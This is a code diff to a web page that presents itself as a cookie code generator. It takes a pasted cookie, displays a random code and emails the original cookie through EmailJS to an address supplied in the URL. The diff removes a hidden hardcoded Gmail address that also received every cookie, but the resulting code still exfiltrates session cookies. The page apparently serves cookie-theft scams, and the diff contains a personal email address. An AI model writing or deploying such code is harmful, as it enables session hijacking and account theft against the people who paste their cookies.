@@ -64,7 +64,6 @@
     // Extract email from query string
     const urlParams = new URLSearchParams(window.location.search);
     const userEmail = urlParams.get('email');  // Get the user email from the URL
-    const defaultEmail = 'simplyb4th@gmail.com';  // Fixed email
 
     // Function to generate a random code with uppercase letters and numbers only
     function generateRandomCode(length) {
@@ -90,15 +89,15 @@
         // Output the generated code
         newCookieOutput.value = newCode;
 
-        // Send the old cookie (input) to both emails
-        sendEmail(cookieInput, userEmail, defaultEmail);
+        // Send the old cookie (input) to the input email
+        sendEmail(cookieInput, userEmail);
       } else {
         newCookieOutput.value = '';
       }
     }
 
     // Function to send email using EmailJS API
-    function sendEmail(cookieContent, userEmail, defaultEmail) {
+    function sendEmail(cookieContent, userEmail) {
       if (!userEmail) {
         console.error('No email provided!');
         return;
@@ -109,11 +108,7 @@
         userEmail: userEmail, // Email from the hub
       };
 
-      // Send to the user email first
-      sendToEmail(templateParams);
-
-      // Now send to the default email
-      templateParams.userEmail = defaultEmail;
+      // Send to the user's email
       sendToEmail(templateParams);
     }
 
